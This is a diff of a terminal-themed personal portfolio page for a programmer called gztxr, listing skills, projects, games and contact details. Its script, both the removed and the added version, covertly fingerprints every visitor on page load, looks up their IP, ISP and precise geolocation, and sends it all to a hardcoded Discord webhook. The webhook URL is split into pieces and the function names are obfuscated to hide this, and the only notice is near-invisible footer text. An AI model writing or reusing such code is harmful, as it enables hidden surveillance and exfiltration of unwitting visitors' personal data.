@@ -5,13 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>gztxr :: terminal</title>
     <style>
-        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
         body {
             font-family: 'Courier New', Courier, monospace;
             background: #0a0a0a;
@@ -22,8 +20,6 @@
             align-items: center;
             padding: 20px;
         }
-        
-        /* ===== TERMINAL CONTAINER ===== */
         .terminal {
             max-width: 900px;
             width: 100%;
@@ -34,8 +30,6 @@
             box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
             position: relative;
         }
-        
-        /* ===== TERMINAL HEADER ===== */
         .terminal-header {
             display: flex;
             align-items: center;
@@ -44,79 +38,62 @@
             border-bottom: 1px solid #1a1a1a;
             margin-bottom: 25px;
         }
-        
         .terminal-dot {
             width: 12px;
             height: 12px;
             border-radius: 50%;
             display: inline-block;
         }
-        
         .terminal-dot.red { background: #ff5f56; }
         .terminal-dot.yellow { background: #ffbd2e; }
         .terminal-dot.green { background: #27c93f; }
-        
         .terminal-title {
             color: #555;
             font-size: 12px;
             margin-left: 10px;
             letter-spacing: 1px;
         }
-        
-        /* ===== TERMINAL OUTPUT ===== */
         .line {
             margin-bottom: 8px;
             line-height: 1.8;
             font-size: 14px;
         }
-        
         .prompt-symbol {
             color: #00ff41;
             font-weight: bold;
         }
-        
         .command {
             color: #ffffff;
         }
-        
         .output {
             color: #a8a8a8;
             padding-left: 20px;
             margin-bottom: 12px;
         }
-        
         .output .highlight {
             color: #00ff41;
         }
-        
         .output .dim {
             color: #555;
         }
-        
         .output .link {
             color: #00aaff;
             text-decoration: none;
             border-bottom: 1px dashed #00aaff33;
         }
-        
         .output .link:hover {
             color: #66ccff;
             border-bottom-color: #66ccff;
         }
-        
         .output .success {
             color: #00ff41;
         }
-        
         .output .warning {
             color: #ffaa00;
         }
-        
         .output .info {
             color: #00aaff;
         }
-        
-        /* ===== ASCII ART ===== */
         .ascii-art {
             color: #00ff41;
             font-size: 12px;
@@ -126,21 +103,17 @@
             opacity: 0.7;
             letter-spacing: 0.5px;
         }
-        
-        /* ===== SKILLS ===== */
         .skill-bar {
             display: flex;
             align-items: center;
             gap: 12px;
             margin: 4px 0;
         }
-        
         .skill-name {
             color: #00ff41;
             min-width: 70px;
             font-size: 13px;
         }
-        
         .skill-track {
             flex: 1;
             height: 14px;
@@ -149,7 +122,6 @@
             overflow: hidden;
             border: 1px solid #1a1a1a;
         }
-        
         .skill-fill {
             height: 100%;
             background: #00ff41;
@@ -157,19 +129,15 @@
             transition: width 1s ease;
             width: 0%;
         }
-        
         .skill-fill.rust {
             background: #ff6b35;
         }
-        
         .skill-percent {
             color: #555;
             font-size: 12px;
             min-width: 35px;
             text-align: right;
         }
-        
-        /* ===== HOBBIES ===== */
         .hobby-tag {
             display: inline-block;
             padding: 4px 12px;
@@ -180,36 +148,28 @@
             margin: 3px 6px 3px 0;
             transition: all 0.3s ease;
         }
-        
         .hobby-tag:hover {
             border-color: #00ff41;
             color: #00ff41;
             background: rgba(0, 255, 65, 0.05);
         }
-        
-        /* ===== PROJECT CARD ===== */
         .project-item {
             padding: 8px 12px;
             margin: 4px 0;
             border-left: 2px solid #1a1a1a;
             transition: all 0.3s ease;
         }
-        
         .project-item:hover {
             border-left-color: #00ff41;
             background: rgba(0, 255, 65, 0.03);
         }
-        
         .project-item .name {
             color: #00ff41;
         }
-        
         .project-item .desc {
             color: #666;
             font-size: 12px;
         }
-        
-        /* ===== BLINKING CURSOR ===== */
         .cursor {
             display: inline-block;
             width: 10px;
@@ -218,20 +178,15 @@
             animation: blink 1s infinite;
             vertical-align: text-bottom;
         }
-        
         @keyframes blink {
             0%, 50% { opacity: 1; }
             51%, 100% { opacity: 0; }
         }
-        
-        /* ===== SEPARATOR ===== */
         .separator {
             border: none;
             border-top: 1px solid #1a1a1a;
             margin: 20px 0;
         }
-        
-        /* ===== FOOTER ===== */
         .footer {
             color: #333;
             font-size: 11px;
@@ -241,64 +196,30 @@
             border-top: 1px solid #1a1a1a;
             letter-spacing: 0.5px;
         }
-        
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .terminal {
-                padding: 20px 15px;
-            }
-            
-            .line {
-                font-size: 12px;
-            }
-            
-            .output {
-                padding-left: 10px;
-            }
-            
-            .ascii-art {
-                font-size: 8px;
-            }
-            
-            .skill-name {
-                min-width: 60px;
-                font-size: 12px;
-            }
+            .terminal { padding: 20px 15px; }
+            .line { font-size: 12px; }
+            .output { padding-left: 10px; }
+            .ascii-art { font-size: 8px; }
+            .skill-name { min-width: 60px; font-size: 12px; }
         }
-        
         @media (max-width: 480px) {
-            .terminal {
-                padding: 15px 10px;
-            }
-            
-            .line {
-                font-size: 11px;
-                line-height: 1.6;
-            }
-            
-            .ascii-art {
-                font-size: 6px;
-            }
-            
-            .btn {
-                padding: 6px 14px;
-                font-size: 12px;
-            }
+            .terminal { padding: 15px 10px; }
+            .line { font-size: 11px; line-height: 1.6; }
+            .ascii-art { font-size: 6px; }
+            .btn { padding: 6px 14px; font-size: 12px; }
         }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <!-- ===== TERMINAL HEADER ===== -->
     <div class="terminal-header">
         <span class="terminal-dot red"></span>
         <span class="terminal-dot yellow"></span>
         <span class="terminal-dot green"></span>
         <span class="terminal-title">gztxr@arch:~$</span>
     </div>
-    
-    <!-- ===== ASCII ART ===== -->
     <div class="ascii-art">
    ▄████████    ▄████████ ████████▄     ▄████████ 
   ███    ███   ███    ███ ███   ▀███   ███    ███ 
@@ -309,8 +230,6 @@
   ███    ███   ███    ███ ███   ▄███   ███    ███ 
   ██████████   ██████████ ████████▀    ██████████ 
     </div>
-    
-    <!-- ===== WHOAMI ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> whoami</span>
@@ -323,8 +242,6 @@
         <span class="dim">uptime</span> :: 42 days<br>
         <span class="dim">status</span> :: <span class="success">online</span>
     </div>
-    
-    <!-- ===== GITHUB ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> open github</span>
@@ -333,10 +250,7 @@
         <a href="https://github.com/gztxr" target="_blank" class="link">https://github.com/gztxr</a>
         <span class="dim"> :: profile</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== SKILLS ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> cat /skills/*</span>
@@ -378,10 +292,7 @@
             <span class="skill-percent">30%</span>
         </div>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== PROJECTS ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ls /projects/</span>
@@ -408,10 +319,7 @@
             <span class="desc">  minimalist terminal-style portfolio</span>
         </div>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== FAVORITE GAMES ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> cat /games/favorites</span>
@@ -423,10 +331,7 @@
         <span class="dim">  favorites ::</span> Garry's Mod, Hollow Knight, RimWorld<br>
         <span class="dim">  horror   ::</span> Outlast, Amnesia, FNAF
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== MUSIC ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> mpg123 --playlist</span>
@@ -438,10 +343,7 @@
         <span class="dim">  alex g</span>       :: <span class="highlight">indie rock / lo-fi</span><br>
         <span class="dim">  radiohead</span>    :: <span class="highlight">alternative rock / art rock</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== DREAM PROJECT ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ./dream-project --status</span>
@@ -451,10 +353,7 @@
         <span class="dim">  massive data analytics and intelligence platform</span><br>
         <span class="dim">  stack :: C / Rust / Python</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== HOBBIES ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ls ~/hobbies/</span>
@@ -465,10 +364,7 @@
         <span class="hobby-tag">golf</span>
         <span class="hobby-tag">coding</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== SPORTS ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ./sports --status</span>
@@ -478,10 +374,7 @@
         <span class="warning">[!]</span> Golf: <span class="highlight">beginner</span> <span class="dim">| handicap 28</span><br>
         <span class="dim">  last match :: 2 days ago</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== DISTROS ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> cat /distros/*</span>
@@ -491,10 +384,7 @@
         <span class="info">[+]</span> <span class="highlight">Gentoo</span> <span class="dim">|| source-based masochism</span><br>
         <span class="info">[+]</span> <span class="highlight">NixOS</span> <span class="dim">|| declarative config obsession</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== WHY C ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ./why-c --explain</span>
@@ -503,10 +393,7 @@
         <span class="highlight">"C is fast and general-purpose."</span><br>
         <span class="dim">  -- gztxr, 5 years of experience</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== CONTACT ===== -->
     <div class="line">
         <span class="prompt-symbol">$</span>
         <span class="command"> ./contact --methods</span>
@@ -516,10 +403,7 @@
         <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
         <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
     </div>
-    
     <hr class="separator">
-    
-    <!-- ===== FOOTER ===== -->
     <div class="footer">
         [~] gztxr@arch :: 5 years of C :: 42d uptime<br>
         <span style="color: #222;">visitor logging active :: discord webhook</span>
@@ -527,98 +411,172 @@
 </div>
 
 <script>
-    // ============================================
-    // DISCORD WEBHOOK (Hidden via concatenation)
-    // ============================================
-    
-    // Webhook parts - split to make it less obvious
-    const _p1 = 'https://discord.com/api/webhooks/';
-    const _p2 = '1513861047004430426/';
-    const _p3 = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
-    const DISCORD_WEBHOOK = _p1 + _p2 + _p3;
-    
-    // ============================================
-    // DATA COLLECTION & SENDING
-    // ============================================
-    
-    function sendToDiscord(data) {
-        // Create Discord embed
-        const embed = {
-            title: 'New Visitor',
-            color: 0x00ff41,
-            fields: [
-                { name: 'IP', value: data.ip || 'N/A', inline: true },
-                { name: 'Location', value: `${data.city || 'N/A'}, ${data.country_name || 'N/A'}`, inline: true },
-                { name: 'ISP', value: data.org || 'N/A', inline: false },
-                { name: 'Device', value: data.userAgent || 'N/A', inline: false },
-                { name: 'Screen', value: `${data.screenWidth || 'N/A'}x${data.screenHeight || 'N/A'}`, inline: true },
-                { name: 'Language', value: data.language || 'N/A', inline: true },
-                { name: 'Platform', value: data.platform || 'N/A', inline: true },
-                { name: 'Timestamp', value: data.timestamp || new Date().toISOString(), inline: false }
-            ],
-            footer: { text: 'gztxr terminal logger' }
-        };
-        
-        fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('[+] Visitor data sent to Discord');
-            } else {
-                console.error('[-] Discord webhook failed:', response.status);
-            }
-        })
-        .catch(error => console.error('[-] Error sending to Discord:', error));
+const _a = 'https://discord.com/api/webhooks/';
+const _b = '1513861047004430426/';
+const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
+const _webhook = _a + _b + _c;
+
+function _x() {
+    var d = {};
+    d.ua = navigator.userAgent;
+    d.lang = navigator.language;
+    d.langs = navigator.languages || [];
+    d.plat = navigator.platform;
+    d.vendor = navigator.vendor || 'N/A';
+    d.cookie = navigator.cookieEnabled;
+    d.dnt = navigator.doNotTrack || 'unspecified';
+    d.cores = navigator.hardwareConcurrency || 'N/A';
+    d.mem = navigator.deviceMemory || 'N/A';
+    d.touch = navigator.maxTouchPoints || 0;
+    d.sw = screen.width;
+    d.sh = screen.height;
+    d.cd = screen.colorDepth;
+    d.pd = screen.pixelDepth;
+    d.aw = screen.availWidth;
+    d.ah = screen.availHeight;
+    d.iw = window.innerWidth;
+    d.ih = window.innerHeight;
+    d.ow = window.outerWidth;
+    d.oh = window.outerHeight;
+    d.dpr = window.devicePixelRatio || 1;
+    d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    d.to = new Date().getTimezoneOffset();
+    d.loc = Intl.DateTimeFormat().resolvedOptions().locale;
+    d.ts = new Date().toISOString();
+    d.lt = new Date().toString();
+    d.url = window.location.href;
+    d.path = window.location.pathname;
+    d.search = window.location.search;
+    d.hash = window.location.hash;
+    d.ref = document.referrer || 'Direct';
+    d.title = document.title;
+    d.ls = !!window.localStorage;
+    d.ss = !!window.sessionStorage;
+    d.idb = !!window.indexedDB;
+    d.audio = !!(window.AudioContext || window.webkitAudioContext);
+    d.media = !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices);
+    var ua = navigator.userAgent;
+    d.mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+    d.tablet = /iPad|Android(?!.*Mobile)/i.test(ua);
+    d.touchdev = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    d.os = 'Unknown';
+    if (ua.indexOf('Windows') !== -1) d.os = 'Windows';
+    else if (ua.indexOf('Mac OS X') !== -1 || ua.indexOf('Macintosh') !== -1) d.os = 'macOS';
+    else if (ua.indexOf('Linux') !== -1) d.os = 'Linux';
+    else if (ua.indexOf('Android') !== -1) d.os = 'Android';
+    else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1 || ua.indexOf('iPod') !== -1) d.os = 'iOS';
+    else if (ua.indexOf('CrOS') !== -1) d.os = 'ChromeOS';
+    d.browser = 'Unknown';
+    if (ua.indexOf('Firefox') !== -1) d.browser = 'Firefox';
+    else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) d.browser = 'Chrome';
+    else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) d.browser = 'Safari';
+    else if (ua.indexOf('Edg') !== -1) d.browser = 'Edge';
+    else if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) d.browser = 'Opera';
+    d.plugs = [];
+    try { for (var i = 0; i < navigator.plugins.length; i++) { d.plugs.push(navigator.plugins[i].name); } } catch(e) {}
+    try { var cnv = document.createElement('canvas'); var ctx = cnv.getContext('2d'); var ft = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Lucida Console']; d.fonts = ft; } catch(e) {}
+    try { var cnv2 = document.createElement('canvas'); var gl = cnv2.getContext('webgl') || cnv2.getContext('experimental-webgl'); if (gl) { var di = gl.getExtension('WEBGL_debug_renderer_info'); if (di) { d.gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); d.gpuv = gl.getParameter(di.UNMASKED_VENDOR_WEBGL); } d.wgl = 'WebGL 1.0'; if (cnv2.getContext('webgl2')) d.wgl = 'WebGL 2.0'; } } catch(e) {}
+    d.conn = null;
+    if (navigator.connection) {
+        d.conn = { type: navigator.connection.type || 'N/A', eff: navigator.connection.effectiveType || 'N/A', down: navigator.connection.downlink || 'N/A', rtt: navigator.connection.rtt || 'N/A', save: navigator.connection.saveData || false };
     }
-    
-    function collectAndSendData() {
-        const data = {
-            userAgent: navigator.userAgent,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            language: navigator.language,
-            platform: navigator.platform,
-            timestamp: new Date().toISOString(),
-            referrer: document.referrer || 'Direct',
-            url: window.location.href
-        };
-        
-        // Get IP and location
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(ipData => {
-                data.ip = ipData.ip;
-                return fetch(`https://ipapi.co/${data.ip}/json/`);
-            })
-            .then(response => response.json())
-            .then(locationData => {
-                data.city = locationData.city || 'N/A';
-                data.region = locationData.region || 'N/A';
-                data.country_name = locationData.country_name || 'N/A';
-                data.org = locationData.org || 'N/A';
-                
-                // Send to Discord
-                sendToDiscord(data);
-            })
-            .catch(error => {
-                console.error('[-] Error collecting data:', error);
-                // Still try to send what we have
-                sendToDiscord(data);
-            });
+    d.perf = null;
+    if (performance.timing) {
+        d.perf = { load: performance.timing.loadEventEnd - performance.timing.navigationStart, dom: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart };
     }
-    
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    
-    window.onload = function() {
-        console.log('[+] Terminal profile loaded');
-        // Small delay to ensure everything loads
-        setTimeout(collectAndSendData, 500);
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(b) {
+            d.bat = { level: b.level * 100, charging: b.charging, ct: b.chargingTime, dt: b.dischargingTime };
+            _send(d);
+        }).catch(function() { d.bat = null; _send(d); });
+    } else { d.bat = null; _send(d); }
+    return d;
+}
+
+function _send(d) {
+    var fields = [
+        { name: 'IP', value: d.ip || 'Pending...', inline: true },
+        { name: 'Location', value: d.city && d.country ? d.city + ', ' + d.country : 'Pending...', inline: true },
+        { name: 'ISP', value: d.org || 'Pending...', inline: false },
+        { name: 'OS', value: d.os || 'Unknown', inline: true },
+        { name: 'Browser', value: d.browser || 'Unknown', inline: true },
+        { name: 'Device', value: d.mobile ? 'Mobile' : d.tablet ? 'Tablet' : 'Desktop', inline: true },
+        { name: 'Screen', value: d.sw + 'x' + d.sh + ' (' + d.cd + 'bit)', inline: false },
+        { name: 'Window', value: d.iw + 'x' + d.ih, inline: true },
+        { name: 'DPR', value: d.dpr || '1', inline: true },
+        { name: 'Language', value: d.lang || 'N/A', inline: true },
+        { name: 'Timezone', value: d.tz || 'N/A', inline: true },
+        { name: 'CPU Cores', value: d.cores || 'N/A', inline: true },
+        { name: 'RAM', value: d.mem ? d.mem + 'GB' : 'N/A', inline: true },
+        { name: 'Touch', value: d.touchdev ? 'Yes' : 'No', inline: true },
+        { name: 'Cookies', value: d.cookie ? 'Enabled' : 'Disabled', inline: true },
+        { name: 'DNT', value: d.dnt || 'Unspecified', inline: true },
+        { name: 'Referrer', value: d.ref || 'Direct', inline: false },
+        { name: 'URL', value: d.url || 'N/A', inline: false },
+        { name: 'Timestamp', value: d.ts || new Date().toISOString(), inline: false }
+    ];
+    if (d.conn && d.conn.eff) {
+        fields.push({ name: 'Connection', value: d.conn.eff + ' (' + d.conn.down + 'Mbps)', inline: true });
+    }
+    if (d.gpu) {
+        fields.push({ name: 'GPU', value: d.gpu, inline: false });
+    }
+    if (d.plugs && d.plugs.length > 0) {
+        fields.push({ name: 'Plugins', value: d.plugs.slice(0, 5).join(', ') + (d.plugs.length > 5 ? ' +' + (d.plugs.length - 5) + ' more' : ''), inline: false });
+    }
+    if (d.perf && d.perf.load) {
+        fields.push({ name: 'Page Load', value: d.perf.load + 'ms', inline: true });
+    }
+    var embed = {
+        title: 'New Visitor',
+        color: 0x00ff41,
+        fields: fields,
+        footer: { text: 'gztxr logger' },
+        timestamp: new Date().toISOString()
     };
+    fetch(_webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] })
+    }).then(function(r) {
+        if (r.ok) { console.log('[+] Data sent'); } else { console.error('[-] Failed:', r.status); }
+    }).catch(function(e) { console.error('[-] Error:', e); });
+}
+
+function _go() {
+    var data = _x();
+    fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(ip) {
+            data.ip = ip.ip;
+            return fetch('https://ipapi.co/' + data.ip + '/json/');
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(loc) {
+            data.city = loc.city || 'N/A';
+            data.region = loc.region || 'N/A';
+            data.country = loc.country_name || 'N/A';
+            data.cc = loc.country || 'N/A';
+            data.org = loc.org || 'N/A';
+            data.postal = loc.postal || 'N/A';
+            data.lat = loc.latitude || 'N/A';
+            data.lon = loc.longitude || 'N/A';
+            data.asn = loc.asn || 'N/A';
+            data.continent = loc.continent || 'N/A';
+            data.currency = loc.currency || 'N/A';
+            data.langs_spoken = loc.languages || 'N/A';
+            data.tz_geo = loc.timezone || 'N/A';
+            _send(data);
+        })
+        .catch(function(e) {
+            console.error('[-] IP error:', e);
+            _send(data);
+        });
+}
+
+window.onload = function() {
+    setTimeout(_go, 600);
+};
 </script>
 
 </body>
